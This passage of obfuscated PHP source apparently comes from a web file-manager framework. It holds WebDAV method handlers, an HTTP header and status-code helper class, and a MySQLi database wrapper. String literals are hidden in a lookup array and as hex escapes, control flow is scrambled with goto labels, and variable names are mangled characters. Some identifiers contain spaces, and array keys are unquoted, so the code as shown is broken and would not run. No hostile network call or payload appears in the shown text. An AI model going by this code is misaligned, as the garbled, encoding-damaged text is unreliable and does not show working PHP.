CŠøÌİŸŒ: } public function httpHEAD() { $CÀ…³Áø„ô =& $_SERVER[¯Ò¬Èè]; $eİìƒ«É¤À = $this->pathInfo($this->path); if (!$eİìƒ«É¤À || $eİìƒ«É¤À[$CÀ…³Áø„ô[29]] == $CÀ…³Áø„ô[76]) { return array($CÀ…³Áø„ô[1041] => 200, $CÀ…³Áø„ô[1215] => array($CÀ…³Áø„ô[1811])); } return array($CÀ…³Áø„ô[1041] => 200, $CÀ…³Áø„ô[1215] => array($CÀ…³Áø„ô[1812], $CÀ…³Áø„ô[136], $CÀ…³Áø„ô[1813] . $eİìƒ«É¤À[$CÀ…³Áø„ô[77]], $CÀ…³Áø„ô[1814] . get_file_mime($eİìƒ«É¤À[$CÀ…³Áø„ô[160]]), $CÀ…³Áø„ô[132] . gmdate($CÀ…³Áø„ô[1800], $eİìƒ«É¤À[$CÀ…³Áø„ô[1262]]) . $CÀ…³Áø„ô[1815], $CÀ…³Áø„ô[1816])); } public function httpOPTIONS() { $DéöŠáñ¯š =& $_SERVER[¯Ò¬Èè]; return array($DéöŠáñ¯š[1041] => 200, $DéöŠáñ¯š[1215] => array($DéöŠáñ¯š[1817], $DéöŠáñ¯š[1818], $DéöŠáñ¯š[1819], $DéöŠáñ¯š[1271])); } public function httpPROPPATCH() { $Cè±‹íèİ =& $_SERVER[¯Ò¬Èè]; $C‚Ø¥›éªÑ = $Cè±‹íèİ[1820] . $_SERVER[$Cè±‹íèİ[1397]] . $Cè±‹íèİ[1821]; return array($Cè±‹íèİ[1808] => 207, $Cè±‹íèİ[1809] => "\74\104\x3a\155\x75\x6c\164\151\163\164\x61\x74\165\x73\x20\x78\x6d\154\156\x73\x3a\x44\75\42\104\101\x56\x3a\x22\x3e\12{$C‚Ø¥›éªÑ}\12\74\57\x44\72\x6d\165\154\x74\x69\x73\164\x61\164\x75\x73\76"); } public function httpGET() { $this->pathOut($this->path); } public function httpPUT() { $f»è¯“ëÅï =& $_SERVER[¯Ò¬Èè]; $bš ô‡ôğ = $this->uploadFile(); if ($bš ô‡ôğ) { $Aà˜ƒ»Î™ = 204; } else { $bš ô‡ôğ = $f»è¯“ëÅï[33]; $Aà˜ƒ»Î™ = 201; } $dÖ¬·´½²¯ = $this->pathPut($this->path, $bš ô‡ôğ); if ($dÖ¬·´½²¯ == !1) { $Aà˜ƒ»Î™ = 404; } return array($f»è¯“ëÅï[1808] => $Aà˜ƒ»Î™); } private function uploadFile() { goto cù†Ï®‰Öù; cËøØàÃÈí: while (!feof($eÖÎÚØ‹óÌ)) { fwrite($fŠóóÑß†, fread($eÖÎÚØ‹óÌ, 1024 * 200)); } fclose($eÖÎÚØ‹óÌ); fclose($fŠóóÑß†); goto eÛ¶Í»Ø“÷; Bâ²¼”ùŒ: $fŠóóÑß† = @fopen($fÌÏ‹àôŞ, $FË‚°‹›òš[1531]); $eÖÎÚØ‹óÌ = @fopen($FË‚°‹›òš[1823], $FË‚°‹›òš[1530]); if (!$eÖÎÚØ‹óÌ || !$fŠóóÑß†) { @unlink($fÌÏ‹àôŞ); return !1; } goto cËøØàÃÈí; eÛ¶Í»Ø“÷: if (@filesize($fÌÏ‹àôŞ) > 0) { return $fÌÏ‹àôŞ; } @unlink($fÌÏ‹àôŞ); return !1; goto Dë½Æ¢Ğ”÷; cù†Ï®‰Öù: $FË‚°‹›òš =& $_SERVER[¯Ò¬Èè]; @mk_dir(TEMP_FILES); $fÌÏ‹àôŞ = TEMP_FILES . $FË‚°‹›òš[1822] . rand_string(32); goto Bâ²¼”ùŒ; Dë½Æ¢Ğ”÷: } public function httpMKCOL() { $E‚‹•ÇˆÚ‚ =& $_SERVER[¯Ò¬Èè]; if ($this->pathExists($this->path)) { return array($E‚‹•ÇˆÚ‚[1041] => 409); } $c·×ˆ‰¤×Ë = $this->pathMkdir($this->path); return array($E‚‹•ÇˆÚ‚[1041] => $c·×ˆ‰¤×Ë ? 201 : 403); } public function httpMOVE() { $e£Ğ¬îêÙ½ =& $_SERVER[¯Ò¬Èè]; $CâÌ°ƒÔÀ = $this->parsePath($this->pathGet(!0)); if (isset($_SERVER[$e£Ğ¬îêÙ½[1824]])) { $EÄ‘‡‰‘ï[$e£Ğ¬îêÙ½[1825]] = $_SERVER[$e£Ğ¬îêÙ½[1824]] == $e£Ğ¬îêÙ½[1826]; } $a ßòŠœÌá = $this->pathMove($this->path, $CâÌ°ƒÔÀ); return array($e£Ğ¬îêÙ½[1041] => $a ßòŠœÌá ? 201 : 404); } public function httpCOPY() { $f¬”ê¬î³¼ = $this->parsePath($this->pathGet(!0)); $F”ÖÒ¦ï™– = $this->pathCopy($this->path, $f¬”ê¬î³¼); return array($_SERVER[¯Ò¬Èè][1041] => $F”ÖÒ¦ï™– ? 201 : 404); } public function httpDELETE() { $Bßº²Æ±†‰ = $this->pathRemove($this->path); return array($_SERVER[¯Ò¬Èè][1041] => $Bßº²Æ±†‰ ? 200 : 503); } public function httpLOCK() { $EÑ’­å‹œ =& $_SERVER[¯Ò¬Èè]; $c‘²æ‹ù©œ = md5($this->path); $fâ¾¬¹·Ş‹ = $EÑ’­å‹œ[1827] . $this->xmlGet($EÑ’­å‹œ[1828]) . $EÑ’­å‹œ[1829] . $c‘²æ‹ù©œ . $EÑ’­å‹œ[1830]; return array($EÑ’­å‹œ[1041] => 200, $EÑ’­å‹œ[1215] => array($EÑ’­å‹œ[1831] . $c‘²æ‹ù©œ, $EÑ’­å‹œ[1832]), $EÑ’­å‹œ[1833] => $fâ¾¬¹·Ş‹); } public function httpUNLOCK() { return array($_SERVER[¯Ò¬Èè][1041] => 204); } public function xmlGet($e‡¼ÉõÃ) { goto dÂ’ß¥é›Ø; dÂ’ß¥é›Ø: $aÄ§µÔÍ‰í =& $_SERVER[¯Ò¬Èè]; static $Bâ£††ù½¶ = false; if (!$Bâ£††ù½¶) { $EÌÆÎÑÊÍä = file_get_contents($aÄ§µÔÍ‰í[1834]); $Bâ£††ù½¶ = new DOMDocument(); $Bâ£††ù½¶->loadXML($EÌÆÎÑÊÍä); } goto FãÑ¡±óéø; FãÑ¡±óéø: $E”òÏÄ‰ËÍ = array_shift(explode($aÄ§µÔÍ‰í[8], $e‡¼ÉõÃ)); $dœÜ»ª‚ÂÊ = $Bâ£††ù½¶->getElementsByTagNameNS($aÄ§µÔÍ‰í[1835], $E”òÏÄ‰ËÍ); if ($dœÜ»ª‚ÂÊ) { return $dœÜ»ª‚ÂÊ[0]->nodeValue; } goto aàè¯øí×; aàè¯øí×: return $aÄ§µÔÍ‰í[33]; goto F¸•¬Êöø‹; F¸•¬Êöø‹: } public static function response($fŞ®ˆÓŒî­) { goto e¥òÎáíÚá; cË‚‡®Û‹: $Fî£µ¹—šê[] = $a½³…•«„ì[1775]; $Fî£µ¹—šê[] = $a½³…•«„ì[1776]; foreach ($Fî£µ¹—šê as $A‡”ƒœ»µ) { header($A‡”ƒœ»µ); } goto Aî¨—Öò‹Ì; e¥òÎáíÚá: $a½³…•«„ì =& $_SERVER[¯Ò¬Èè]; $Fî£µ¹—šê = is_array($fŞ®ˆÓŒî­[$a½³…•«„ì[1215]]) ? $fŞ®ˆÓŒî­[$a½³…•«„ì[1215]] : array(); $Fî£µ¹—šê[] = HttpHeader::code($fŞ®ˆÓŒî­[$a½³…•«„ì[1041]]); goto cË‚‡®Û‹; Aî¨—Öò‹Ì: if (is_string($fŞ®ˆÓŒî­[$a½³…•«„ì[1833]])) { header($a½³…•«„ì[1836]); $A«Ç› íñµ = $a½³…•«„ì[1837] . $a½³…•«„ì[217] . $fŞ®ˆÓŒî­[$a½³…•«„ì[1833]]; echo $A«Ç› íñµ; } goto e’ßäİğŠ; e’ßäİğŠ: } } class HttpHeader { public static $_headers = array("\110\157\163\x74" => "\x48\124\x54\x50\137\x48\117\x53\124", "\x55\x73\145\162\55\101\x67\145\x6e\164" => "\110\124\124\x50\137\125\123\x45\x52\137\101\x47\105\x4e\x54", "\103\157\156\164\x65\x6e\164\x2d\124\171\160\145" => "\x48\124\124\120\x5f\103\x4f\x4e\124\105\x4e\x54\137\124\x59\120\105", "\103\157\x6e\164\x65\x6e\164\55\114\x65\x6e\147\x74\150" => "\x48\124\x54\x50\137\103\x4f\x4e\x54\x45\x4e\124\x5f\x4c\105\116\107\x54\x48", "\x44\x65\160\x74\150" => "\110\124\x54\x50\137\x44\x45\x50\124\110", "\105\x78\x70\145\143\164" => "\x48\124\124\120\137\105\x58\x50\x45\x43\124", "\111\x66\x2d\x4e\x6f\156\x65\55\x4d\141\x74\143\150" => "\x48\x54\124\120\x5f\111\x46\x5f\116\x4f\116\x45\137\x4d\101\x54\x43\110", "\x49\x66\55\115\x61\164\x63\x68" => "\110\x54\x54\120\137\111\106\x5f\115\x41\x54\103\110", "\x49\x66\55\122\141\156\x67\145" => "\110\x54\x54\x50\x5f\111\x46\137\x52\101\116\x47\105", "\114\141\163\164\55\115\x6f\144\151\146\151\145\x64" => "\110\x54\124\120\x5f\114\x41\123\124\x5f\115\117\104\111\106\111\105\x44", "\111\146\x2d\115\x6f\144\x69\x66\x69\x65\144\55\x53\151\156\x63\145" => "\x48\124\x54\x50\137\x49\106\x5f\x4d\x4f\104\111\x46\111\105\104\x5f\123\x49\x4e\x43\105", "\x49\x66\55\x55\156\155\157\x64\x69\x66\151\x65\x64\55\123\x69\156\143\145" => "\x48\124\124\x50\x5f\x49\x46\x5f\x55\116\x4d\117\104\111\106\x49\105\x44\137\x53\x49\x4e\x43\x45", "\122\141\x6e\x67\x65" => "\x48\x54\x54\120\x5f\122\x41\116\x47\x45", "\x54\151\155\145\157\165\x74" => "\x48\x54\x54\x50\137\x54\x49\115\105\x4f\x55\x54", "\111\146" => "\110\124\x54\x50\x5f\111\106", "\x4c\x6f\x63\153\x2d\124\x6f\153\x65\x6e" => "\x48\124\124\120\137\114\117\x43\113\x5f\x54\117\113\105\116", "\117\x76\x65\162\167\x72\151\x74\145" => "\x48\124\x54\x50\x5f\117\126\105\122\127\122\111\x54\105", "\x44\145\x73\x74\151\x6e\141\x74\151\x6f\x6e" => "\110\124\x54\120\137\104\105\123\124\x49\x4e\101\x54\x49\117\116", "\122\145\161\165\145\x73\164\55\x49\x64" => "\x52\105\121\125\105\x53\124\137\111\x44", "\122\x65\x71\165\x65\163\x74\55\x42\157\144\171\55\106\x69\x6c\x65" => "\122\105\x51\x55\105\123\124\137\x42\x4f\104\131\x5f\x46\111\114\105", "\122\145\x64\151\x72\x65\x63\x74\x2d\123\164\141\164\x75\x73" => "\122\x45\104\x49\122\105\x43\124\x5f\123\x54\101\124\x55\123"); public static function init() { static $eë…¼ï²é— = false; if ($eë…¼ï²é—) { return; } foreach ($_SERVER as $BÕôáÅä‰ => $aÈ‡æ‡œ°) { $BÕôáÅä‰ = strtoupper($BÕôáÅä‰); if (!array_key_exists($BÕôáÅä‰, $_SERVER)) { continue; } $_SERVER[$BÕôáÅä‰] = $aÈ‡æ‡œ°; } foreach (self::$_headers as $BÕôáÅä‰ => $b²˜¥åŸ„•) { if (!array_key_exists($BÕôáÅä‰, $_SERVER)) { continue; } $_SERVER[$BÕôáÅä‰] = $_SERVER[$b²˜¥åŸ„•]; $_SERVER[strtoupper($BÕôáÅä‰)] = $_SERVER[$b²˜¥åŸ„•]; } } public static function get($AœíÆæ“™Ö) { self::init(); return $_SERVER[$AœíÆæ“™Ö] ? $_SERVER[$AœíÆæ“™Ö] : $_SERVER[$_SERVER[¯Ò¬Èè][1838] . strtoupper($AœíÆæ“™Ö)]; } public static function method() { return strtoupper(self::get($_SERVER[¯Ò¬Èè][154])); } public static function length() { $dÕàÓ¤ò¡ =& $_SERVER[¯Ò¬Èè]; $c§¨†¹ÛÏ = self::get($dÕàÓ¤ò¡[1839]); if (!$c§¨†¹ÛÏ) { $c§¨†¹ÛÏ = self::get($dÕàÓ¤ò¡[1154]); } return $c§¨†¹ÛÏ; } public static function range() { $B¡Íä‚Á¾è =& $_SERVER[¯Ò¬Èè]; $BÆ‰”Æ–óÃ = self::get($B¡Íä‚Á¾è[198]); if (!$BÆ‰”Æ–óÃ) { return !1; } if (!preg_match($B¡Íä‚Á¾è[1840], $BÆ‰”Æ–óÃ, $aÅŠ†‚àÚó)) { return !1; } if ($aÅŠ†‚àÚó[1] === $B¡Íä‚Á¾è[33] && $aÅŠ†‚àÚó[2] === $B¡Íä‚Á¾è[33]) { return !1; } return array($aÅŠ†‚àÚó[1] !== $B¡Íä‚Á¾è[33] ? $aÅŠ†‚àÚó[1] : null, $aÅŠ†‚àÚó[2] !== $B¡Íä‚Á¾è[33] ? $aÅŠ†‚àÚó[2] : null); } public static $statusCode = array("\61\x30\x30" => "\103\157\x6e\164\151\x6e\x75\x65", "\x31\60\61" => "\x53\167\151\164\143\x68\x69\x6e\x67\x20\120\162\x6f\x74\x6f\x63\x6f\154", "\x31\60\62" => "\120\162\x6f\143\x65\163\x73\x69\x6e\147", "\x31\60\x33" => "\x45\x61\x72\154\x79\40\x48\x69\x6e\x74\163", "\x32\x30\x30" => "\117\x4b", "\62\60\61" => "\103\162\x65\x61\164\145\x64", "\x32\60\x32" => "\x41\x63\143\x65\160\164\x65\144", "\x32\x30\x33" => "\x4e\157\156\x2d\101\x75\x74\x68\157\162\151\164\141\x74\x69\x76\145\40\111\156\x66\x6f\162\x6d\141\x74\x69\157\x6e", "\62\x30\x34" => "\116\x6f\40\x43\x6f\156\x74\145\156\164", "\x32\60\65" => "\x52\x65\x73\145\x74\40\103\157\x6e\x74\145\x6e\164", "\x32\x30\66" => "\120\141\x72\164\x69\141\x6c\40\103\x6f\x6e\x74\x65\x6e\164", "\x32\x30\x37" => "\115\165\x6c\164\x69\x2d\x53\164\x61\x74\165\163", "\63\x30\x30" => "\x4d\x75\x6c\164\151\x70\x6c\x65\x20\x43\150\157\x69\143\x65\163", "\63\x30\x31" => "\x4d\x6f\166\145\x64\40\120\145\x72\155\x61\x6e\x65\156\x74\154\171", "\63\x30\62" => "\x46\157\x75\156\x64", "\63\60\63" => "\x53\145\x65\x20\x4f\x74\150\x65\x72", "\x33\60\64" => "\x4e\x6f\x74\40\115\x6f\x64\x69\146\x69\145\x64", "\63\60\x35" => "\125\x73\x65\40\x50\x72\157\x78\171", "\63\x30\x37" => "\124\145\x6d\160\157\162\141\162\x79\x20\x52\145\x64\151\x72\x65\143\x74", "\x33\60\x38" => "\120\145\162\155\141\156\145\156\x74\40\x52\x65\x64\x69\x72\145\143\x74", "\64\x30\60" => "\x42\141\x64\40\x52\145\161\165\145\x73\164", "\64\60\x31" => "\x55\x6e\x61\165\164\150\x6f\x72\151\x7a\x65\x64", "\x34\x30\x32" => "\120\141\171\x6d\145\156\164\x20\x52\x65\x71\165\151\x72\x65\x64", "\64\60\63" => "\x46\157\x72\x62\x69\x64\144\x65\x6e", "\64\60\x34" => "\x4e\157\164\x20\x46\x6f\x75\156\144", "\64\x30\x35" => "\x4d\x65\164\150\x6f\144\40\x4e\x6f\164\40\x41\x6c\x6c\x6f\x77\x65\144", "\x34\x30\x36" => "\116\157\164\40\x41\x63\143\x65\x70\x74\x61\x62\x6c\145", "\x34\60\x37" => "\120\162\157\x78\171\40\x41\x75\164\x68\x65\156\x74\151\x63\141\164\x69\157\156\x20\x52\145\161\165\x69\x72\x65\144", "\x34\x30\70" => "\x52\x65\x71\165\x65\x73\x74\40\x54\151\155\x65\157\165\164", "\x34\60\71" => "\x43\157\156\x66\x6c\x69\x63\164", "\64\61\60" => "\x47\x6f\x6e\x65", "\64\61\x31" => "\x4c\x65\156\x67\x74\150\x20\122\x65\x71\x75\151\162\x65\144", "\64\61\x32" => "\120\162\145\143\x6f\156\x64\151\x74\151\x6f\x6e\40\106\x61\151\154\x65\x64", "\x34\61\x33" => "\122\x65\x71\165\145\x73\x74\x20\105\x6e\164\151\164\x79\40\x54\157\157\40\x4c\141\x72\147\x65", "\64\61\x34" => "\x52\x65\161\165\x65\163\x74\x20\x55\122\x49\x20\x54\157\157\40\114\141\162\x67\145", "\x34\61\65" => "\125\x6e\163\165\160\x70\x6f\x72\x74\x65\144\x20\x4d\145\x64\151\x61\40\124\171\x70\x65", "\64\x31\x36" => "\x52\x65\161\x75\145\x73\x74\x65\144\x20\x52\x61\x6e\147\145\x20\116\157\x74\x20\123\141\x74\151\x73\146\151\x61\x62\154\x65", "\64\61\67" => "\x45\170\x70\x65\143\164\141\x74\x69\157\x6e\x20\x46\141\151\154\145\x64", "\64\62\62" => "\125\x6e\x70\x72\157\x63\x65\163\163\141\142\154\x65\40\105\x6e\164\x69\164\x79", "\x34\x32\63" => "\x4c\x6f\x63\153\145\x64", "\x34\x32\64" => "\x46\141\151\x6c\145\x64\x20\x44\x65\x70\x65\156\x64\x65\156\x63\171", "\x34\62\65" => "\125\156\157\x72\x64\x65\x72\x65\x64\40\103\157\154\154\x65\x63\x74\x69\157\x6e", "\x34\62\x36" => "\125\x70\x67\162\141\x64\145\x20\122\x65\161\165\x69\162\x65\x64", "\x34\62\x38" => "\x50\x72\x65\143\x6f\x6e\x64\x69\164\x69\x6f\156\x20\x52\x65\x71\165\x69\162\145\x64", "\x34\x32\71" => "\x54\157\157\40\115\x61\x6e\x79\40\122\145\x71\165\145\x73\164\x73", "\x34\63\61" => "\122\x65\x71\x75\x65\x73\164\x20\x48\x65\x61\x64\145\162\40\x46\151\145\154\144\163\x20\124\x6f\x6f\40\x4c\x61\162\147\x65", "\64\64\64" => "\x4e\157\40\122\145\x73\160\x6f\156\x73\145", "\64\65\x30" => "\x42\x6c\x6f\143\x6b\x65\144\x20\142\x79\x20\127\x69\x6e\144\157\167\x73\40\120\x61\162\145\156\x74\141\x6c\x20\x43\x6f\x6e\x74\x72\x6f\154\x73", "\x34\65\x31" => "\x55\156\141\166\x61\151\154\x61\x62\154\x65\x20\106\x6f\162\40\x4c\x65\147\141\154\40\x52\x65\x61\163\157\156\x73", "\x34\71\x34" => "\x52\x65\161\x75\145\x73\x74\40\x48\145\141\x64\145\x72\x20\x54\x6f\157\x20\114\141\162\x67\x65", "\x35\60\60" => "\111\156\x74\x65\x72\156\141\154\x20\x53\145\x72\x76\145\x72\40\105\x72\162\x6f\162", "\x35\x30\x31" => "\116\157\x74\40\111\x6d\x70\x6c\x65\155\x65\156\x74\x65\144", "\65\60\62" => "\x42\x61\144\x20\x47\141\164\x65\167\141\171", "\x35\x30\x33" => "\123\x65\x72\x76\151\143\145\40\x55\x6e\x61\166\x61\151\x6c\x61\142\x6c\x65", "\x35\x30\64" => "\107\141\x74\x65\167\141\171\x20\x54\x69\155\x65\x6f\x75\x74", "\65\x30\x35" => "\x48\124\x54\x50\x20\126\145\x72\x73\x69\x6f\x6e\40\156\157\x74\40\x73\x75\160\x70\157\x72\x74\x65\x64", "\x35\60\67" => "\x49\x6e\163\x75\146\x66\x69\x63\x69\145\156\x74\40\123\x74\x6f\x72\141\x67\145"); public static function code($eã’ÁÖ¶Ş) { $ašÖ’ø¹©ƒ =& $_SERVER[¯Ò¬Èè]; $eã’ÁÖ¶Ş = $eã’ÁÖ¶Ş . $ašÖ’ø¹©ƒ[33]; $Dµä¤Úß½‡ = self::$statusCode[$eã’ÁÖ¶Ş]; $Dµä¤Úß½‡ = $Dµä¤Úß½‡ ? "\110\x54\x54\x50\x2f\x31\x2e\x31\x20{$eã’ÁÖ¶Ş}\x20" . $Dµä¤Úß½‡ : $ašÖ’ø¹©ƒ[33]; return $Dµä¤Úß½‡; } } goto fÊ©†Š‘Ÿ°; F¹’Ğ…Ÿ‹–: class DbMysqli extends Db { public function __construct($d´ÑĞÌµ®É = '') { $CÍÂÓïÄ†Ë =& $_SERVER[¯Ò¬Èè]; if (!extension_loaded($CÍÂÓïÄ†Ë[741])) { think_exception(think_lang($CÍÂÓïÄ†Ë[10]) . $CÍÂÓïÄ†Ë[834]); } if (!empty($d´ÑĞÌµ®É)) { $this->config = $d´ÑĞÌµ®É; if (empty($this->config[$CÍÂÓïÄ†Ë[13]])) { $this->config[$CÍÂÓïÄ†Ë[13]] = $CÍÂÓïÄ†Ë[33]; } } } public function connect($fƒ×ßË¿” = '', $e‚ØØÑºŞó = 0) { $BĞ¼ÅÑ¬À =& $_SERVER[¯Ò¬Èè]; if (!isset($this->linkID[$e‚ØØÑºŞó])) { goto BñĞ„£çšÉ; eÁİŒİ¯¾á: $B±Ô³š®Ü™ = $this->linkID[$e‚ØØÑºŞó]->server_version; $this->linkID[$e‚ØØÑºŞó]->query($BĞ¼ÅÑ¬À[812] . think_config($BĞ¼ÅÑ¬À[813]) . $BĞ¼ÅÑ¬À[55]); if ($B±Ô³š®Ü™ > $BĞ¼ÅÑ¬À[814]) { $this->linkID[$e‚ØØÑºŞó]->query($BĞ¼ÅÑ¬À[815]); } goto bÕ¶¬½Í£; bÕ¶¬½Í£: $this->connected = !0; if (1 != think_config($BĞ¼ÅÑ¬À[18])) { unset($this->config); } goto B¿“ŞÚ¯; BñĞ„£çšÉ: if (empty($fƒ×ßË¿”)) { $fƒ×ßË¿” = $this->config; } $this->linkID[$e‚ØØÑºŞó] = new mysqli($fƒ×ßË¿”[$BĞ¼ÅÑ¬À[808]], $fƒ×ßË¿”[$BĞ¼ÅÑ¬À[810]], $fƒ×ßË¿”[$BĞ¼ÅÑ¬À[811]], $fƒ×ßË¿”[$BĞ¼ÅÑ¬À[17]], $fƒ×ßË¿”[$BĞ¼ÅÑ¬À[809]] ? intval($fƒ×ßË¿”[$BĞ¼ÅÑ¬À[809]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } goto eÁİŒİ¯¾á; B¿“ŞÚ¯: } return $this->linkID[$e‚ØØÑºŞó]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($f¼Õ‚Öğ) { goto a×Ùµ¶Æ†; càßÀ…­Ç: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } goto b½àÉ¬«‰; a×Ùµ¶Æ†: $EóèœÈö£– =& $_SERVER[¯Ò¬Èè]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto CÆ×½ªóœ†; CÆ×½ªóœ†: $this->queryStr = $f¼Õ‚Öğ; if ($this->queryID) { $this->free(); } think_action_status($EóèœÈö£–[19], 1); goto eì­£ÈÏ ô; eì­£ÈÏ ô: think_status($EóèœÈö£–[20]); $this->queryID = $this->_linkID->query($f¼Õ‚Öğ); if ($this->_linkID->more_results()) { while (($a†ÜôŞö  = $this->_linkID->next_result()) != NULL) { $a†ÜôŞö ->free_result(); } } goto càßÀ…­Ç; b½àÉ¬«‰: } public function execute($Dí×óÅÓ‚Ğ) { goto FĞ³Îòš¬; bê°ì÷Ü¬È: think_status($dÎÕ¶‘•²â[20]); $B«ÄÜõ±´­ = $this->_linkID->query($Dí×óÅÓ‚Ğ); $this->debug(); goto AõŠï„¾®ò; AõŠï„¾®ò: if (!1 === $B«ÄÜõ±´­) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } goto f°„“’òÒ…; F¢‰Û¤°°¼: $this->queryStr = $Dí×óÅÓ‚Ğ; if ($this->queryID) { $this->free(); } think_action_status($dÎÕ¶‘•²â[21], 1); goto bê°ì÷Ü¬È; FĞ³Îòš¬: $dÎÕ¶‘•²â =& $_SERVER[¯Ò¬Èè]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto F¢‰Û¤°°¼; f°„“’òÒ…: } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $b·ò¤„•…é = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$b·ò¤„•…é) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $Eƒ…ÄÉŠ‘ò = $this->_linkID->rollback(); $this->transTimes = 0; if (!$Eƒ…ÄÉŠ‘ò) { $this->error(); return !1; } } return !0; } private function getAll() { $D“Ì´·ÎŒ‚ = array(); if ($this->numRows > 0) { for ($c¤…íë·”µ = 0; $c¤…íë·”µ < $this->numRows; $c¤…íë·”µ++) { $D“Ì´·ÎŒ‚[$c¤…íë·”µ] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $D“Ì´·ÎŒ‚; } public function getFields($fõòŒ÷ÜÎ–) { $F×Á§äÙÎÊ =& $_SERVER[¯Ò¬Èè]; $e°¤¸ÙÛ« = $this->query($F×Á§äÙÎÊ[819] . $this->parseKey($fõòŒ÷ÜÎ–)); $FåŠõÀ­Ãí = array(); if ($e°¤¸ÙÛ«) { foreach ($e°¤¸ÙÛ« as $AåàÙëìÜ => $D©ïÚÛÓÂ¡) { $FåŠõÀ­Ãí[$D©ïÚÛÓÂ¡[$F×Á§äÙÎÊ[27]]] = array($F×Á§äÙÎÊ[28] => $D©ïÚÛÓÂ¡[$F×Á§äÙÎÊ[27]], $F×Á§äÙÎÊ[29] => $D©ïÚÛÓÂ¡[$F×Á§äÙÎÊ[30]], $F×Á§äÙÎÊ[31] => (bool) ($D©ïÚÛÓÂ¡[$F×Á§äÙÎÊ[32]] === $F×Á§äÙÎÊ[33]), $F×Á§äÙÎÊ[34] => $D©ïÚÛÓÂ¡[$F×Á§äÙÎÊ[35]], $F×Á§äÙÎÊ[36] => strtolower($D©ïÚÛÓÂ¡[$F×Á§äÙÎÊ[37]]) == $F×Á§äÙÎÊ[38], $F×Á§äÙÎÊ[39] => strtolower($D©ïÚÛÓÂ¡[$F×Á§äÙÎÊ[40]]) == $F×Á§äÙÎÊ[41]); } } return $FåŠõÀ­Ãí; } public function getTables($A‰îŒ —Ø¶ = '') { $dƒ£Üõ½õŠ =& $_SERVER[¯Ò¬Èè]; $FñŞï³–Ø = !empty($A‰îŒ —Ø¶) ? $dƒ£Üõ½õŠ[821] . $A‰îŒ —Ø¶ : $dƒ£Üõ½õŠ[822]; $BÃë‡Î¤„¬ = $this->query($FñŞï³–Ø); $A¡—‹Œ——Ï = array(); if ($BÃë‡Î¤„¬) { foreach ($BÃë‡Î¤„¬ as $AÌ™ŸàÕÕ… => $d§Ûè‘Ò²á) { $A¡—‹Œ——Ï[$AÌ™ŸàÕÕ…] = current($d§Ûè‘Ò²á); } } return $A¡—‹Œ——Ï; } public function replace($Dì°³ÆíËº, $eŒØ×àÏÂ = array()) { $dº§ç¤ö† =& $_SERVER[¯Ò¬Èè]; foreach ($Dì°³ÆíËº as $b÷Ì¯Å†Û => $BËîˆİğ‹) { $AŒ“‡…÷£ = $this->parseValue($BËîˆİğ‹); if (is_scalar($AŒ“‡…÷£)) { $F«„ º™ì‰[] = $AŒ“‡…÷£; $e´¨‰îÔ¨[] = $this->parseKey($b÷Ì¯Å†Û); } } $B‘¨ªÂ¯“œ = $dº§ç¤ö†[823] . $this->parseTable($eŒØ×àÏÂ[$dº§ç¤ö†[267]]) . $dº§ç¤ö†[824] . implode($dº§ç¤ö†[47], $e´¨‰îÔ¨) . $dº§ç¤ö†[825] . implode($dº§ç¤ö†[47], $F«„ º™ì‰) . $dº§ç¤ö†[826]; return $this->execute($B‘¨ªÂ¯“œ); } public function insertAll($BÎ¢ÒÕ‡–ß, $e›šéä±³ß = array(), $d…¯á´Å‡ˆ = false) { goto e‰²š´ò¿; e‰²š´ò¿: $eˆàŒˆ¦Ü¾ =& $_SERVER[¯Ò¬Èè]; if (!is_array($BÎ¢ÒÕ‡–ß[0])) { return !1; } $bŠ£ÛÜçÙá = array_keys($BÎ¢ÒÕ‡–ß[0]); goto Aø¼¢ˆº³ô; Aø¼¢ˆº³ô: $f˜ƒˆö©‚ = array(); foreach ($BÎ¢ÒÕ‡–ß as $BÉ´èõº) { $C´‡äèšõ = array(); foreach ($BÉ´èõº as $b·¬Áù™„é => $f£Î¦À³Ñ) { $f£Î¦À³Ñ = $this->parseValue($f£Î¦À³Ñ); if (is_scalar($f£Î¦À³Ñ)) { $C´‡äèšõ[] = $f£Î¦À³Ñ; } } $f˜ƒˆö©‚[] = $eˆàŒˆ¦Ü¾[248] . implode($eˆàŒˆ¦Ü¾[47], $C´‡äèšõ) . $eˆàŒˆ¦Ü¾[826]; } array_walk($bŠ£ÛÜçÙá, array($this, $eˆàŒˆ¦Ü¾[827])); goto aâˆöï°‡¯; aâˆöï°‡¯: $fÁìé¥£Í™ = ($d…¯á´Å‡ˆ ? $eˆàŒˆ¦Ü¾[828] : $eˆàŒˆ¦Ü¾[829]) . $eˆàŒˆ¦Ü¾[830] . $this->parseTable($e›šéä±³ß[$eˆàŒˆ¦Ü¾[267]]) . $eˆàŒˆ¦Ü¾[824] . implode($eˆàŒˆ¦Ü¾[47], $bŠ£ÛÜçÙá) . $eˆàŒˆ¦Ü¾[831] . implode($eˆàŒˆ¦Ü¾[47], $f˜ƒˆö©‚); return $this->execute($fÁìé¥£Í™); goto Bê²«¡‡; Bê²«¡‡: } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $Aíà©²³ÂŠ =& $_SERVER[¯Ò¬Èè]; $this->error = $this->_linkID->errno . $Aíà©²³ÂŠ[4] . $this->_linkID->error; if ($Aíà©²³ÂŠ[33] != $this->queryStr) { $this->error .= LNG($Aíà©²³ÂŠ[45]) . $this->queryStr; } think_trace($this->error, $Aíà©²³ÂŠ[33], $Aíà©²³ÂŠ[46]); return $this->error; } public function escapeString($fÖŸÍÚ‚•) { if ($this->_linkID) { return $this->_linkID->real_escape_string($fÖŸÍÚ‚•); } else { return addslashes($fÖŸÍÚ‚•); } } public function parseKey(&$d…Æ“ò, $bä„¹¡Ì»± = true) { 